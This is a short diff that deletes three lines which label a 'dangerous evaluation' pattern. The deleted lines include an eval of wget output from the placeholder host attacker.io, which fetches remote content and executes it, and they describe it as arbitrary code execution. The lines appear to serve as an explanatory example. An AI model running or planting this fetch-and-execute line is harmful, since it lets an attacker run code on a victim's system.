@@ -1,3 +1,0 @@
-Dangerous evaluation:
-eval("$(wget -O- attacker.io)")
-Arbitrary code execution.
